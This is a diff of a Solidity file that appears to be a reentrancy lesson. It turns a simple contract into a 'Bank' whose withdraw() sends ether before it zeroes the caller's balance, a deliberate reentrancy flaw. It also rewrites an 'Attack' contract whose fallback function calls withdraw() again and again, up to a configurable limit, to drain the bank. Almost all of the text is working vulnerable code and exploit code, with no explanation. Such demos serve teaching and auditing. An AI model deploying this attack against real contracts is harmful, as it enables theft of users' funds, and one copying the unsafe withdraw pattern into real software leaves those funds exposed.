@@ -18,38 +18,56 @@ receive() exists?  fallback()
     receive()   fallback()
     */
 
-contract Reentrancy{
+contract Bank {
 
-    uint public maxBalanceForWithdraw;
+    mapping (address => uint) private userBalances;
 
-    function Reentrancy() {
-        maxBalanceForWithdraw = 300;
+    function stake() public payable {
+        require(msg.value > 0);
+        userBalances[msg.sender] += msg.value;
     }
 
-    function withdraw() {
-        if (!msg.sender.call.value(maxBalanceForWithdraw)()) revert(); 
-        maxBalanceForWithdraw = 0;
+    function withdraw() public {
+        uint withdrawAmount = userBalances[msg.sender];
+        (bool success, ) = msg.sender.call.value(withdrawAmount)("");
+        require(success, "Withdraw failed");
+        userBalances[msg.sender] = 0;
     }
 
-    function deposit() payable {}
+    function getBalance() public view returns (uint) {
+        return userBalances[msg.sender];
+    }
+
+    function getTotalBalance() public view returns (uint) {
+        return address(this).balance;
+    }
+
 }
 
-contract ReentrancyAttacker {
-
-    Reentrancy v;
+contract Attack {
+    Bank b;
     uint public count;
+    uint public limit;
 
-    function ReentrancyAttacker(address victim) payable {
-        v = Reentrancy(victim);
+    function setVictimAddress(address victim) payable {
+        b = Bank(victim);
+    }
+
+    function setLimit(uint _limit) external {
+        limit = _limit;
+    }
+
+    function stake() public payable {
+        b.stake.value(msg.value)();
     }
 
     function attack() {
-        v.withdraw();
+        b.withdraw();
     }
 
     function() payable {
         count++;
-        if(count < 10) v.withdraw();
+        if(count < limit) b.withdraw();
     }
 
 }
